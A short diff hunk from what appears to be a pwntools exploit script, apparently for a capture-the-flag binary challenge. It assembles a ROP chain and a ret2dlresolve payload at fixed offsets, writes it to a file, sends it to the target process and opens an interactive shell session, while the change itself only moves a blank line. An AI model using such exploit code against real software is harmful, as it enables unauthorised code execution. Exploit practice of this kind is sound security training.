@@ -16,6 +16,6 @@ x = fit({0x80+context.bytes: raw_rop, 0x150: dlresolve.payload})
 print(x)
 with open("payload", "wb") as f:
 	f.write(x)
+	
 p.sendline(x)
-
 p.interactive()
